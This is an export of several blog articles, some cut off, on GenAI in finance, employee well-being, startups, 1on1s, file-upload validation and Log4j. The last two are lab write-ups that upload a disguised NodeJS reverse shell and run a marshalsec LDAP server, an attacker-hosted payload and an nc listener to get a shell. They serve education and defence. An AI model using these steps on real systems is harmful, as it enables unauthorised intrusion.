      "content"  : "I wrote this article for Danubius Tech Blog originally.In the past 2 years, ChatGPT and other generative AI solutions have sparked a revolution in the business world and beyond. Today, it would be challenging to find a business professional who hasn’t heard of these tools, and fewer still who haven’t experimented with them in their daily lives or work even unwillingly.The rapid adoption of GenAI demonstrates the immense potential of generative AI technologies or the laziness of white-collar employees. Maybe both. Business leaders, entrepreneurs, and professionals across industries have recognized that this tool is not just a passing technological fad, but a real value-creating opportunity that could fundamentally change how we work in numerous sectors. Is it?It is hard to separate the real value and hype factors of GenAI at a corporate levelA recent McKinsey study provides valuable insights into how CFOs and other responsibles can approach Gen AI both at the enterprise tier and within finance functions. C-level managers play a crucial role in identifying and allocating resources to the most valuable opportunities, regardless of whether they involve AI. It’s not about the hype, it’s about the revenue. Some things never change – the fundamental principles of finance and economics remain the same: companies must generate returns above their cost of capital.Figure 1 – The Pareto principle in action: A small number of opportunities often deliver most of a company’s cash flows. We know that, but how do we find them? – Image source: Yves LeBreasseurKey points for CFOs:  Prioritize the top 20-30 value-creating projects across the organization.  Recognize existential threats to the company’s businesses.  Understand the key drivers for generating and sustaining higher cash flows.  Don’t dismiss efficiency boost opportunities due to a lack of understanding or imagination.Point #4 is easy to forget or overlook. Gen AI is set to become an essential tool for most finance functions, potentially saving significant time and resources. McKinsey’s survey indicates that the majority of finance functions in large enterprises are likely to use Gen AI substantially within the next 3-5 years.Analyzing the financial performance by maturityWave 1: Digital foundationThe first wave (Figure 2) focuses on data visualization and connectivity, where top-performing organizations achieve a 65% performance rate compared to 62% for other organizations. This relatively small gap (1.1x difference) suggests that basic digital infrastructure has become widely adopted across the financial sector.Figure 2 – Financial performance – Source: McKinsey &amp; CompanyStrategic implicationsThe small performance gap highlights two critical points:  Basic digital capabilities are now essential for survival rather than a source of competitive advantage, organizations must look beyond digitalization to differentiate themselves.  The foundation must be solid before moving to more advanced waves.Wave 2: Analytics empowermentIn the second wave, which centers on advanced analytics for finance, the performance gap widens significantly. Top performers achieve 60% performance while other organizations only reach 37%. This 1.6x difference indicates that advanced analytics capabilities have become a key differentiator in financial performance. Data analysis seems mandatory to remain a top participant in the race.Wave 3: Intelligent automation revolutionThe third wave, characterized by intelligent automation and robotics, shows a performance rate of 36% for top performers versus 26% for others. While the absolute numbers are lower due to the emerging nature of these technologies, the 1.4x performance difference demonstrates that early adopters of AI and automation are gaining competitive advantages.It would be easy to choose Wave 3, “Okay, I want this”, but the decreasing absolute percentages across waves reflect the increasing complexity and sophistication of each technological stage, while the performance gaps highlight how digital capabilities are becoming essential differentiators in financial success.Gen AI can impact finance functions in three primary ways: automation (e.g. preparation of a draft material), augmentation (e.g. more productive work or work environment for people), and acceleration (e.g. knowledgebase, informational reporting). How should you start?How to evolve?Organizations looking to advance their AI capabilities have several strategic options:1. Start small, think bigBuild foundational capabilities first through pilot projects and targeted implementations, while maintaining a vision for broader transformation.2. Focus on value creationSelect AI initiatives based on clear business value rather than technological novelty, prioritizing projects with measurable ROI.3. Invest in peopleDevelop internal capabilities through training and upskilling programs to ensure staff can effectively utilize AI tools.4.

      "content"  : "I wrote this article for Danubius Tech Blog originally.Numerous research studies have consistently illustrated that an employee’s physical, mental, and social health at work is inextricably linked to enhanced productivity and overall company performance. Thus, it’s more than just a moral obligation; ensuring the holistic well-being of the workforce is a strategic imperative.The hours we spend at our desks, in meetings, or collaborating with teammates don’t just affect our professional lives. They cast ripples into our personal lives, shaping our moods, stress levels, and overall sense of fulfillment. For employers, the challenge lies in fostering a work environment where employees not only feel motivated during working hours but also carry a sense of positivity and satisfaction after they clock out.This holistic approach to employee well-being goes beyond the realm of company profits. It’s about recognizing employees as more than just assets or resources - they are human beings, with emotions, aspirations, and vulnerabilities. The intricate fabric of their well-being is woven from multiple threads, spanning various aspects of their work life.In the dynamic world of IT, where the pace of technological evolution is dizzying and project deadlines can be stringent, the mental toll can be substantial. A lack of focus or unmanageable stressors can escalate to burnout, affecting both individual and team outcomes.To ensure we’re on the right track, every year we conduct an employer satisfaction survey. This isn’t a mere formality. It’s an earnest attempt to tune into the heartbeat of our organization. By comparing the feedback across years, we gain insights into the evolving sentiments and needs of our team members. These findings then take center stage in a comprehensive forum, where everyone gets an understanding of the company’s internal perception and collaboratively envisions the roadmap for the future.Ensuring Security and Fostering Transparent CommunicationWorkplace well-being is anchored in several foundational pillars, one of the most crucial being the assurance of security. Our commitment to this principle begins from the very inception of an employee’s journey with us. From the initial stages of onboarding, we prioritize consistent engagement (common lunches, sincere interest, informal chit-chats and involvement, etc.), ensuring that our new colleagues are well-informed and have clarity about their immediate future within the organization. This proactive approach ensures that every team member feels not only welcomed but also integrated into our professional community from the outset.Furthermore, we staunchly advocate for transparent, open and consistent communication. In an ever-evolving global landscape marked by challenges ranging from pandemics and geopolitical tensions to economic fluctuations, it is imperative to maintain an open dialogue with our team. By candidly discussing topics such as the consequences of the current economic climate on our operations, projects, revenue streams, and subsequently, compensation and benefits, we aim to foster an environment of trust and understanding. Through this approach, we believe in empowering our employees with the knowledge and context they need to navigate these uncertain times alongside the company.Open Dialogue and Addressing Genuine NeedsIn fostering a culture of professional excellence, we place significant emphasis on open communication and the power of active listening. Recognizing the importance of individualized touchpoints, we have organized regular one-on-one sessions with managers, as outlined in our guide on effective 1-on-1 meetings. Years ago these meetings predominantly focused on work-related discussions, encompassing project feedback and task progress, nowadays colleagues realize that these are also an avenue for their exchange of personal insights, experiences and their future.Our culture is rooted in the understanding that acknowledging challenges and articulating them can pave the way for tangible solutions. If immediate resolutions aren’t feasible, our commitment extends to ensuring consistent communication with the concerned individual and exploring long-term strategies for effective remediation.Our organizational flexibility and adaptability can be illustrated through numerous internal career transitions we’ve witnessed. For instance, colleagues have seamlessly transitioned from roles as developers to architects, while others have evolved from being analysts to developers or even marketers to scrum masters. And now they love their new path!However, our support system doesn’t end with internal dialogues. Recognizing that certain challenges might warrant specialized intervention, we offer dedicated sessions twice a week where team members can engage with a professional coach. This initiative is geared towards addressing both professional and personal challenges. Ultimately, the well-being and growth of each individual translate to positive ripple effects across teams and the broader organization, enhancing both cohesion and overall performance.Professional GrowthIn IT, staying abreast of technological advancements is a professional necessity. Recognizing this imperative, we are unwavering in our commitment to facilitating the continuous learning journey of our employees, from trainees to seasoned experts.To ensure a comprehensive learning environment, we offer a robust suite of online training materials, ensuring every member of our organization has unrestricted access to these resources. Understanding that personal guidance can complement structured learning, we’ve instituted a mentoring program, standing strong for several years, specifically designed to nurture our less-experienced talent. This initiative not only aids in their professional growth but also ensures they’re never isolated when navigating project-related challenges, both technically and emotionally.In line with our dedication to fostering an environment of collaborative learning, just over a year ago, we rolled out our ‘buddy program’. This program bridges the experiential gap by pairing mid-level professionals with seasoned experts, especially for those who don’t have senior guidance within their own technical teams. It’s a platform to brainstorm ideas, deliberate over dilemmas, and seek valuable feedback, in the meanwhile a friendly connection evolves.The trajectory of an employee’s well-being often correlates with their perception of growth opportunities within the organization. To make this growth path transparent and tangible, we’ve outlined a clear set of criteria for each role. This enables our team members to discern their current professional standing and the milestones they need to achieve to ascend to the next tier. This structured framework is not just a document but a living guide, reviewed regularly in a face-to-face discussion with the organizational leader, ensuring its relevance and efficacy.Elevating People SkillsWhile technical knowledge remains essential in the IT industry, the cultivation of soft skills has emerged as an equally significant pillar of comprehensive professional growth. Recognizing the increasing demand for these competencies, we have made them part of our development programs.Our organization actively curates and offers a series of trainings tailored to enhancing various soft skills. Whether it’s refining one’s listening and presentation capabilities or facilitating introspective sessions that allow individuals to deeply understand their intrinsic needs and aspirations, our goal remains consistent: creating a holistic growth environment.Feedback and recognition serve as instrumental tools in this developmental matrix. Constructive feedback provides clarity on areas of improvement, promoting an environment of continuous learning. Simultaneously, recognizing and valuing contributions amplifies the sense of self-worth among our team members. This dual approach not only boosts individual morale but also fortifies their commitment to the collective mission of the team. In essence, by nurturing these soft skills, we’re not just refining professional abilities but also reinforcing the emotional and interpersonal foundations upon which our organizational culture thrives.Team CohesionThe interpersonal dynamics and mutual respect shared among colleagues lay the foundation for collective success and individual well-being. With this understanding, our recruitment strategy goes beyond evaluating just the professional credentials. We place significant emphasis on aligning prospective hires with the core values, aspirations, and cultural fabric of our organization.To continually nourish this spirit of community, we provide ample avenues for team members to engage beyond formal work contexts. Our regular company event days, imbued with light-hearted activities, serve as platforms for fostering connections, enabling even the more reserved members to immerse themselves and form bonds with their peers.A testament to the strength of our community is the spontaneous organization of extracurricular activities by our colleagues, reflecting shared interests and hobbies. From sporting events like football to board games, poker nights, and even collaborative gardening projects, these self-initiated gatherings underscore the genuine connections fostered within our ranks. The joy of collectively tending to and enjoying the produce from our communal garden is symbolic of the nurturing and growth-centric culture we cultivate as an organization.Work-Life HarmonyTime, an irreplaceable asset, demands judicious allocation to ensure both personal well-being and professional efficiency. Recognizing its intrinsic value, we staunchly advocate for a harmonious work-life equilibrium.The key to achieving this balance lies in mutual vigilance and empathy. Colleagues should remain attuned to one another’s needs, stepping in with support when signs of imbalance emerge. Maintaining this not only aids immediate project requirements but also preemptively mitigates the risk of burnout, safeguarding the long-term well-being of our team.Beyond individual vigilance, it falls upon leadership to ensure that work distribution is both equitable and sustainable. By continually assessing and recalibrating workloads, we ensure that our team members can dedicate time to both professional excellence and personal rejuvenation, creating a holistic environment that values the totality of our colleagues’ lives.Remote Work and Adaptive SchedulesThe facility for remote work isn’t merely an added perk – it’s essential. By mitigating the daily commute, professionals can reclaim valuable time, allocating it to pursuits that enhance personal well-being or bolster productivity. However, the real question that organizations grapple with is structuring the framework within which remote work operates.Our stance on this is anchored in flexibility and trust. While we designate specific days – either weekly or bi-weekly – as office team days for encouraging collaboration and maintaining team unity, outside of these set intervals, our colleagues have full autonomy to determine their work location. This empowers them to optimize their environment, furthering comfort and productivity.Beyond the spatial flexibility of remote work, we also recognize the significance of adaptive work schedules. Our culture promotes a flexible timing structure, enabling colleagues to tailor their work hours around their innate productivity rhythms, while also accounting for crucial meetings and project milestones.Furthermore, acknowledging the diverse needs and aspirations of our team members, we extend the option of a condensed workweek, allowing colleagues to work just four days if they so choose, freeing up time for self-expression. The growing adoption of this model and the ensuing positive feedback serve as a testament to its efficacy in striking work-life harmony.Physical Comfort: Creating an Ergonomic Work EnvironmentA holistic approach to well-being encompasses not only emotional and social facets but also gives due attention to physical comfort. A conducive physical environment not only amplifies productivity but also ensures that employees conclude their workday feeling revitalized and content.Given the nature of IT roles, where substantial hours are spent in front of computer screens, the quality and ergonomic design of workplace furniture can significantly influence an employee’s physical health. Recognizing this, we have invested in height-adjustable desks and ergonomically designed chairs, ensuring that our colleagues can customize their workspaces to their comfort.Beyond the immediate workspace, supplementary health benefits, such as specialized health insurance policies offering discounted health services, further underscore our commitment to our team’s well-being.The perks matter as well. While offering complimentary coffee might seem trivial, its absence is keenly felt. Similarly, having accessible amenities, be it a chocolate treat in the fridge or a fresh fruit basket, can uplift spirits and offer moments of relaxation. Such gestures, though small, are emblematic of our appreciation for our employees and our dedication to their holistic well-being.ConclusionThe emphasis on employee well-being isn’t just about staying ahead in the business race. It’s about valuing the human spirit, recognizing its strengths, and nurturing its vulnerabilities. At Danubius, prioritizing the well-being of our employees is more than just a commitment – it’s an important goal as well. The employee retention rate stands testament to our efforts and direction in this realm. Moreover, the accolades from our clients reinforce our belief. Sustainable, long-term client relationships are predicated on cohesive teams, where members relish their daily interactions and derive genuine satisfaction from their work.The journey towards a balanced, positive, and vibrant workplace is ongoing, but with collective effort and genuine care, the horizon is promising.I wrote this article for Danubius Tech Blog originally."

      "content"  : "When we think of DevOps, art may not be the first thing that comes to mind. Yet, on a recent evening, we celebrated a unique fusion of the two, showcasing that at the heart of every innovation - whether it’s in the tech industry or the art world - lies creativity, collaboration, and a spirit of continuous improvement.The Exhibition OpeningThe evening began with an enchanting exhibit showcasing colorful paintings, with each piece telling a story of its own, covering 50 years of experience of the artist, Zsuzsanna Domokos. As attendees walked the room, whispers of interpretations and admiration floated around, drawing parallels to the complexities and layers within DevOps processes. (Just kidding, nobody found parallelism between those two, but it seems culture and technical discussions fit well together.)We also had the privilege of conversing with the painter, diving deep into the inspirations behind each creation.Culinary DelightsAs the evening unfolded, guests indulged in an array of culinary delights. The menu was crafted keeping in mind the diverse tastes of our guests, much like how DevOps caters to the varied needs of a project. We never forget that good guests are the ones with full belly.Diving into DevOpsPost our gastronomical journey, it was time to delve into the world of DevOps. I had the opportunity to present a case study focusing on cloud migration through a DevOps lens. The discussion wasn’t just about some technicalities, but to understand the management challenges before and during such projects. I also centered on building teams with a DevOps-centric approach, no matter if it is in customer or supplier side.The narrative highlighted the importance of:  Adaptability: How seamless transitions to cloud platforms require agility and a willingness to embrace change? How can you handle such challenge, what kind of difficulties will you face?  Collaboration: Emphasizing that cloud migration is not a one-man job. It requires developers, operations, devops, cloud, network engineers, architect, etc. Who should be internal, who can be involved from a vendor?  Cut the cake: How can you grab smaller pieces of a giant task?  Internal “political” questions.The presentation was followed by invigorating conversations. Attendees shared their experiences, challenges, and insights into the world of DevOps and also their thoughts about cloud migration not only from technical point of view, but from business, compliance, management perspective as well. The fact that we spent the rest of the late evening talking in small groups on the balcony speaks for itself.The event was enlightening – talking to our customers and understanding their actual needs is the best way to plan the future. Let’s do it again soon!"

Their goals may vary, but the most desired one is usually to get a remote shell to the server computer, and later collect different kinds of information, use CPU to mine cryptocurrency, etc. there. As a developer we need to build secure applications, and sanitizing input data is only one, but very important part of this process.Difference between client and server side validationAs you can see in the figure above, the basic scheme is quite easy: client side validation runs on the user’s computer, while server/application side validation happens on the server side. There are many advantages and disadvantages of both of them, and we don’t plan to summarize all of them here, only a couple.Client side validation can be fast, does not affect our servers/infrastructure, the performance is based only on the client computer’s resources, but it is very easy to bypass, because it runs on local machine. It is written usually in scripting language (most often Javascript or Typescript) so the browser can run it by itself.Server side validation is slower, every check needs at least 1 http request-response pair until it gets results and/or feedback to the user. Our servers’ resources are used, but in exchange it can be far more secure. Any server-side language can be chosen, usually .NET, PHP, Python, Java and related frameworks are the most famous ones.Now that we understand the basics (if you need more info, check here), let’s move on to specific implementation of these.File validation techniquesLet’s iterate through some common validation methods, which are used on the web frequently. String (text) validation will be completely skipped (if you’re interested in it, check this OWASP cheat sheet), and jump instantly to file uploads. Note that the mentioned techniques are not perfectly secure by definition, we need to understand where and how they can be mixed to mitigate the risks.File extension filteringif(file.extension != '.jpg'){    alert('Not valid file extension.');}The easiest way is to check the extension of the uploading file. On Windows systems, the file extension still means something, it helps to define file type, while Unix based operating systems rely on other methods (eg. magic numbers - see it later) to get information about files. This approach is easy to implement, but also easy to bypass (changeable locally), depending on the file.extension calucation method, blacklisting or whitelisting file extensions, etc.File type filteringDifferent techniques are available, let’s see the two most popular ones.Mime typeWhen a client uploads a file via http/s, the header always contain a ‘Content-Type:’ part, where the value is in type/subtype format, e.g. image/jpeg for a jpg picture. It is almost the same as file extension filtering, because mime types are based on extension of the file.Magic numberMagic numbers are the first few bytes of a file, which is completely unique to a certain file type. Linux file command is based on this string.Jpegs are usually allowed in a picture uploader web form, for testing purpose let’s assume we are an attacker, and want to upload a malicious binary or shell script over a magic number validation.We can see, that hex signature of bash script is 23 21, which is accurate. We want to change this beginning to FF D8 FF DB, because that’s the signature of jpegs, so we add 4 chars to the beginning of the file, e.g. AAAA. These will be the bytes we want to change.Let’s change and check it with file.This bash script won’t be able to run without change, but imagine the same with a PHP before the starting of &lt;?php, a malicious backend code can be run after bypassing magic number validation. (Upload as .php, but with jpeg magic number.)File name, length, content filteringFiltering control characters (slash, backslash, asterisk, semicolon, etc.) is mandatory, lengths check is pretty straight-forward, and usually not a real problem for attacker (images are bigger than a functional reverse shell). Fully functional content filtering is complicated, usually not implemented in a single webapp, only the previously mentioned content typing (extension, etc.) are used.Client side attacksThese validations are unsafe, and we do not use these to provide security, but to give customers fast feedbacks and pleasure. How can we bypass?  First and foremost you can completely switch off Javascript in your browser.  Use browser Developer Tools for changing Javascript methods, even if those are obfuscated, use de-obfuscator.  Install a middle-proxy between your client and the server, such as Burp, and manipulate every requests after client validation.  Add or change content type there.Server side attacks  Extension validation can be incomplete (e.g. filtering all .phpX stuff, but forgetting .phtmlX or similar, which is still processed by web server and php plugin)  Content checks and filtering.  Magic numbers we already covered.There are many other validation techniques, which were not mentioned here, know and use them properly for building a secure applications. Remember that security bugs may not be similar to functional ones, where you can fix errors even after customers faced it. In certain situations you may not have the chance to do this after critical, escalated unauthorised access over a security hole.Let’s see how an insufficient validation may cause deeper problems.A short case studyWe use a vulnerable demo box from Tryhackme.Let’s see what’s on client side in html/js code.We can see that there is a length, a jpeg (magic number) and an extension validator. We need to bypass every one of them somehow. With Wappalyzer, we can see that the backend is served by NodeJS, which is important to know, because of the type of possibly usable reverse shells.When we try to upload a non-jpeg file, an error occurs, so the javascript does its job well. So right now we are able to upload jpegs, but we don’t know where those are stored. Let’s try to investigate web directory structure with Gobuster.Many of them are http error 301, because directory listing is prohibited, but assets and content can be good candidates for storing the uploaded files in. The THM box helps us with a keyword list, which contains 3-letter words. Maybe those are directories, files or else, but it’s still a good hint. I only show the final solution below, because the investigation went on different failed ways. Content dir contains uploaded stuff.After uploading a file, it appears here with a randomly chosen 3-char long file name and jpg extension. From previous directory listing we realised that an admin directory is also reachable without any error code (200). This is how it looks like.It seems that the module directory contains scripts which can be executed by this form. The problem is that our uploads are not in that dir, and we can only upload jpegs. Earlier we acknowledged that NodeJS is serving the backend, let’s use this payload to get a reverse shell, and try to upload it as jpeg. Make sure that IP and port is correct, that’s where you should listen for reverse connection.Let’s upload it and check the files again in content directory with gobuster, so we know the actual name of it.We can download the LGV.jpg from content directory to make sure that it’s our file. It is. Let’s go back to the admin page and examine that form, capture the request with Burp proxy.We see that the param is a direct POST parameter. Now start a netcat listener on the previously configured IP and port (10.9.125.225:1234 in my case). If it runs, we should call that ‘jpg’ from the modules directory with relative path. We are pretty sure that the OS is a Linux or other NIX-based system, because it answers ICMP pings and nmap base scans. (Microsoft firewall drops every ICMP request by default.)The connection was successful, we have root shell to the server now, and we didn’t even need to handle the jpeg situation, backend was able to call a jpg directly. Good enough. The room’s input validation was way below average, and the Nginx/NodeJS shouldn’t be run as root, but it still shows us the importance of input validation.Lessons learnedSanitize every single user input, and handle those with proper care on both client and server side. Do not assume anything, check and test those values!I wrote this article for Danubius Tech Blog originally."

      "content"  : "I wrote this article for Danubius Tech Blog originally.What is CVE-2021-44228?In the first half of December, 2021, ransomware attackers received the perfect Santa gift: an easily exploitable Log4j2 vulnerability. Log4j is a widely used, Java-based logging utility published by Apache initially in 2001. Since then it received many updates, and a major release to version 2. As of today, the latest patched version is 2.16.0 (December 13).Today we use this flaw and open shell to our target machine.About the vulnerabilityHowever you may think that a logging tool only processes standard text files with proper input sanitising, well, not every time. Log4j allows us to do some extra lookups there, using templates. An example from Log4j website:The vulnerability is based on the allowance of reaching JNDI (it is a directory service via a Java API, more info here) API through the mentioned lookup mechanism, and there is no restriction for using completely custom prefix in this parameter string. It means that if we use a jndi:ldap:// with an attacker host’s prepared LDAP server, dirty stuff can come (remote code execution). For the record we need to mention, that DNS or RMI protocols can work as well.(Credit for the detailed explanation picture above: Fastly.)Why is it so dangerous?For multiple reasons: for first, it is very easily exploitable, any script kiddie can take advantage of that. Secondly, there are many affected services because of transitive dependencies. Tons of enterprise softwares use this logging mechanism as external lib. Third part is related to the second one, patching Log4j itself is not enough, you need to check and understand, if your enterprise “black-box” software components use this library or not, and if so, plan and carry out proper risk mitigation.Exploitation exampleWe used Tryhackme box to test the exploit. These guys are committed to teach the people of the internet about awareness, security, penetration testing and many more, therefore I can frankly recommend you to give them a try.Starting situationSo we have a vulnerable target computer, which we are allowed to hack. There is a limited VPN between this computer (10.10.17.246) and our own attacker machine (10.9.125.225) with Kali linux ran in Virtualbox.Recon &amp; discoveryLet’s check, if there are any services available with port scanning. Used an aggressive scanning (-A) because of the playing machine (no reason to remain silent), and a dedicated port range for seeing only the relevant port for us. (You should check all ports usually with flag -p-).We see that Apache Solr is running on port 8983, let’s see it in the browser.We see Log4j2 logging scheme, and it’s vulnerable, as it turns out after a short google-fu. The box itself cheats a bit here, because we can see logs from this host, which would be not available in a real situation. (In those circumstances, instead of watching the logs, we could use directory busting or other attack vectors for finding a vulnerable endpoint.)We think that the template is parameterizable (params={}), and also see the /admin/cores endpoint. Here we are.We learned from the vulnerability description that through lookups we can reach external ldap or dns servers. It works over TCP, let’s check what happens, if we try to catch that connection attempt with netcat.Connection is established, but because of LDAP request structure, the output is not readable by humans. However, this is a good sign.ExploitationPoC was successful, now we need a process with a toolset, which can handle LDAP requests, and push an exploit to our Java-based application in an “understandable” format. Obviously, it will mean some kind of Java class(es) / POJO in this case.The plan is to have an LDAP relay or referral server, and a simple http server, which can accept this connection and serve the Java class, which will open a reverse shell to our attacker computer.For LDAP relay we use Marshalsec with Maven. I won’t go in details about the installation, it’s pretty straightforward and well-documented on Github.java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer 'http://10.9.125.225:8000/#Revshell'As a webserver, you can use anything handy, we prefer python3 http server.python3 -m http.serverSo LDAP will use Revshell.class on python webserver, but there is nothing yet. This is the last preparation step.Let’s compile it with javac Revshell.java and copy the class into the python webserver directory. Do not forget that the vulnerability has Java related requirements (pref. Java 7-8 for the build). We used OpenJDK 1.8.0_181.Run the listener, which will accept the reverse connection, and fingers crossed.nc -nltvp 1234Here is our setup as a whole:A short video about getting everything ready.This easy it is to break into systems and receive remote shell via the new Log4j2 vulnerability. It is not a coincidence, that the CVE score of it is 9.7 out of 10, while the CVSS score is 10 out of 10. Absolutely critical.What can we do to save our infrastructure?Patch, patch, patch. Log4j has released fix for the base components, but as we earlier mentioned, we need to cover custom softwares and transitive dependencies as well. Watch the list of vulnerable softwares, contact your vendors, use WAF with proper string filtering, analyse activities, log files and traces. There are a couple online services (e.g. Trendmicro, which provide remote checks of these threats. We do not recommend these, only if you can truly trust in them.I wrote this article for Danubius Tech Blog originally."

      "content"  : "I wrote this article for Danubius Tech Blog originally.Do you have the perfect product idea, a unique and innovative approach, know your potential competitors, and are convinced you can do better? Do you have ideas about how to break into the market, have ideas about marketing and sales, but IT development is not your thing? You’re not alone, we’ve recently been talking to a number of similar startup owners and entrepreneurs across Europe, some of whom we’ve helped to turn their ideas into reality from a development perspective. Many think that they can cover the development part of the process of bringing a product to market by hiring one or two (up to four or five, maybe more) programmers and hope that they will answer all the technical questions. Even if the best developers in the world have been recruited for the task, it will not be that simple and smooth, there are many pitfallss that can hinder the market launch, which can be avoided to a very large extent by conscious planning and preparation. In this post, we will try to gather some of the key, mainly IT-related aspects that are typically missing from business visions and that, apart from writing the source code, will be necessary for the IT and hence business launch of a successful product.What are your predefined goals?Experience has shown that almost everyone wants three things: to produce the software, the tool, the end product quickly, with good quality and cheaply. The bad news is that we can’t pull all the sliders to the maximum, because these three attributes are closely interrelated. But there is also good news: all three attributes are also completely relative, and you may not think of “cheap” as the same as Apple, or “fast” as the same as Google. Of course, you can have the same goals for a startup as you do for a BigTech company, but that’s usually not the case, and even with a more modest budget, smaller hardware or cloud subscription, slower response time, etc. you can still serve your customers very well with maximum satisfaction. Okay, but then where is the limit, you may ask. How do you know what you technically need, and really need? Engineering is also about coordinating these aspects, and effectively making trade-offs along the way.Roles, or what’s beyond the programmerBusiness and System AnalystIt helps gather your business needs and expectations, translates them into requirements, and ultimately into “IT language” so that developers can work from a detailed specification, making their work much faster and more efficient, and significantly reducing lead times.Software Engineer / DeveloperThe traditional developer role, you probably know it best, may overlap with the Analyst on design questions, and then the actual software code is written by the Developer. They do frontend (so the layout have visibility and buttons), backend (they make the data persistent) and interface development, and optimally try to deliver the best quality work available. That’s fine, but because we are human, we make mistakes, and we need to be aware of that, and realise it before actual customers.Manual and Automatic Test EngineerYou may think that you have business people to do the testing, and that’s perfectly fine, but in today’s modern software development, especially for complex applications, it may be worth doing some of these automatically, or supplementing manual testing. We won’t go into this in detail, but in general, the better quality product you want to develop, the more coordinated and system-wide testing you need to do (from the bottom of the testing pyramid: unit tests, module and component tests, integration tests, interface and end-user tests). Setting up quality gates, defining and enforcing a set of criteria is one of the most important guarantees of quality, but you may not need all layers of it.Additional rolesIn addition to the above, depending on the methodology you are working with (typically agile, less often waterfall or other), you may need other roles: Scrum Master / PM (responsible for team operations), Product Owner (responsible for requirements specification, prioritisation and decisions - typically available on the client side), DevOps Engineer (typically responsible for fast and automated delivery, monitoring and live operations, logging), and so on. These are also needed, but to what extent and for how long also depends on the scope of the current project and the requirements.I heard good things about this and that“Be agile/cloud/microservice, because it’s fast/trendy/sexy”Indeed, agile can be great, cloud can be scalable, and microservice architecture offers a lot of possibilities (it’s okay if we don’t understand what it is at the moment), but not because we have Dumbledore’s wand in our hands, but because e.g. agile methodology is based on the simplest possible elements, cloud is only somebody else’s computer with all the advantages and disadvantages, etc.Typically, there is a lot of misunderstanding that agile can be good for everything, because “that’s why it’s agile” - not necessarily. This is not supposed to be a detailed description of agile, but I would like to highlight a few points, not exclusively about the methodology, which we need to consider:      In sprints, scope (backlog items) needs to be managed, planned, measured back, so that – as the team improve together gradually –, we can iteratively increase the amount of work done during an iteration.        The remaining tasks need to be prioritised, refined, so that during planning we know what is next in the queue, so that we can work even more efficiently and quickly.        The tasks (stories) should be clear for everyone and have an attribute about when those are considered completed (Definition of Done, Acceptance Criteria), and testers should pay attention to these, writing test cases and scenarios based on them.        The software runs in different environments and release management levels typically, developers work and test in a development environment, business people test in some kind of acceptance environment (QA, UAT, etc.), in between there may be different integration tests. It is important that the quality gates mentioned above are defined, as this is how we can eliminate any bugs that are left in by accident or mistake. The various non-functional updates, patches, system fixes, etc. need to be tested somewhere if live operation is not to be compromised. These, and the quality gates between them, need to be defined, developed and operated.        Above we have mentioned functional tests, but we would not like to see the application slow down or become inaccessible due to higher load during live operation, or even worse, a malicious hacker breaking into our system. This would require additional tests, performance and security tests (penetration).        Fortunately, it is more and more discussed nowadays, but even if your application works functionally fine, if nobody likes to use it because the interface is not intuitive, not logical, etc., its value is kind of low. It is essential to involve a UX/UI expert and/or knowledge at the design stage.        In terms of parallelisation and scheduling, it is important to see at which points we can accelerate throughput by bringing in additional resources and/or teammates based on dependency-graph. A well-known examples is that 9 women cannot give birth to a baby in one month.        Even for a cohesive team, meeting the end deadline can be a challenge in agile operations, as the team is constantly producing value through continuous feature development, but this does not mean that, without proper planning, all this value produced in small sprints will actually add up to the feature set needed to meet the end goal in X months or years.  “Let’s work, don’t waste time on daily standup and planning, it’s agile, we’ll improve by definition“We’ve heard phrases like this many times over the years, and none of our clients would say it today. They have come to understand that these ceremonies are part of the job. Talking through priorities and planning steps is an integral part of the work, as is looking at what’s been completed, how the team improved at the end of an iteration. Then and there, the fact that - let’s say - Peter’s task delayed a bit because he was waiting for George may not seem important at first, but if we can figure out why the dependency was not handled properly, we can be even better and faster in the next iteration, and the associated developer frustration can be also reduced or in lucky situations completely eliminated.SummaryThe above was not intended to describe a complete software development process, we did not want to give a coherent summary, but to show that product development is (unfortunately) not so simple in IT terms that it can be fully covered by one or two persons with only programming skills. It requires a bigger picture of where we want to go from where, in what timeframe, how much money we have available, what our expectations are, and keeping priorities and dependencies in check to move forward. It is true for agile as well.I wrote this article for Danubius Tech Blog originally."

      "content"  : "I wrote this article for Danubius Tech Blog originally.As a manager, have you ever reorganised your meetings to make more efficient use of your already limited time, to fit that sales presentation, engineering briefing or management coffee in? Can you recall how easy it is to reschedule that certain 1on1 with Peter – “it’ll be fine in three days, won’t it”? Or did you just cancel one, because “we just talked three weeks ago, he’s working, he’s improving, I don’t see a problem, let’s talk next time”? It happened to me several times, but after a while, after a series of realisations, I really tried hard to treat 1on1s the way we all should: as one of the most important development and confidence-building opportunities - not only from a managerial point of view, but also as an employee. What’s worth knowing about this topic?How can it go wrong?Before we deep dive into the many ways in which a culture of 1on1 meetings can bring positive change to an organisation, let’s look at how such an opportunity can be botched and counterproductive.      The first one I just mentioned probably happened to many of us: we reschedule, cancel, we are late, which sends a non-verbal message (especially if it happens very often) that we don’t value our time with the other person.        During the meeting, we don’t pay attention to the other person at all, we ask inquiring questions, but while listening to the answer, we are touching the phone or clicking on the computer, email, or we do other tasks that require little focus.        We rush, consistently and regularly fail to take the time to discuss important issues, fail to provide sufficiently detailed feedback, fail to touch on and discuss opportunities and path for improvement.        From the management side, we only want to know about the progress: “What about this? What about that? How’s Project A going? Did you do the report? Have you finished backend code review?” While it’s certainly important to be aware of how such tasks are going, using a conversation for that alone is inefficient and fails to tap into the deeper potential of 1on1.        We degrade it into a announcement parade: we are constantly talking from the managerial side, telling this and that, news, events, what’s going on in the company, what’s expected next period, etc.        Prompt, immediate reaction to ideas that may be sensitive, require complex work to completely share, take more time to express, and presuppose an atmosphere of trust. Wait for the other party to clarify what he or she is thinking as precisely as possible, so that many misunderstandings can be avoided.        Schedule 1on1s only because “others” do it as well. Don’t go for superficial conversations, it makes no sense and has negative effect.        For Hungarian speakers I suggest watching this short, funny video about how not to do it online.  What can you gain from a 1on1 done correctly?Trust buildingStudies show that in a safe environment, where people can share their thoughts with each other and their manager without fear, colleagues are more productive, their work has higher quality and people are more confident in general. It’s also worth bearing in mind that in more than half of the cases, the leaving employee is not changing jobs, but changing managers, so building a direct, predictable, honest relationship is also beneficial for the team itself, not to mention the easier communication and day-to-day work, which is a clear consequence of this. Since 1on1 meetings can change the atmosphere towards trust in the first place, we also have a huge responsibility to shape the company culture as a whole. It’s also where we can get to know each other more deeply - it’s worth bringing up personal issues if there’s an openness to do so on both sides.Feedback, improving performanceIn a large corporate environment, performance feedback cycles are most often one year, maximum six months, and this frequency is not sufficient for Generation Z born after 1995 (and in many cases not even for those born before). They demand continuous feedback, measuring, opportunities to do more, to improve personally. Regular feedback can be 